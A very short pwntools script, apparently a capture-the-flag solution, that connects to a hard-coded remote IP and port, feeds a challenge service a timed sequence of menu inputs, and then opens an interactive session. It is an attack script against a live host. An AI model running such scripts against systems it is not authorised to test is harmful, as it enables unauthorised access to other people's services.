from pwn import *
r=remote("1.209.148.228",7677)
r.sendline("1")
sleep(25)
r.sendline("4")
r.sendline("10")
r.sendline("rainbow")
r.sendline("6")
r.interactive()
